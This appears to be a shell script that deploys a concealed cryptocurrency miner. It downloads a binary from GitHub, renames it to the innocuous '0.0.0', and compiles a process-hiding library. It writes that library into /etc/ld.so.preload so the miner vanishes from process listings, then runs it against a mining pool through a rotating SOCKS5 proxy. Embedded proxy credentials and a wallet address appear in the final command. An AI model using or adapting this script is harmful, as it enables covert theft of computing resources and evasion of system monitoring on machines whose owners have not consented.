wget https://github.com/Testdrive345/hello/raw/main/test
chmod 777 test
sudo apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++



mv test 0.0.0

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./0.0.0 -a minotaurx -o stratum+tcp://minotaurx.na.mine.zergpool.com:7019 -u MBsiaTaEEUNsMHFZKPmqT35Sv3rbiLLkAp -p  c=LCC,mc=LCC,ID=Test -x socks5://jvyxiovx-rotate:2udhid79wl5a@p.webshare.io:80
